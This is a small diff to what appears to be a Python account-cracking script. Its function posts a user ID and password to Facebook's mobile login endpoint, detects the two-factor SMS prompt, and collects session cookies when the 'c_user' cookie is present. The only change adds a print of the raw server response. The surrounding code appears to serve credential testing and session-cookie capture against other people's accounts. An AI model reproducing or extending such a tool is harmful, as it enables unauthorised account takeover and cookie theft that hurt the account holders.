@@ -1890,6 +1890,7 @@ def d(uid,pwx,tl):
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data2, headers=headers).text
+            print(po)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
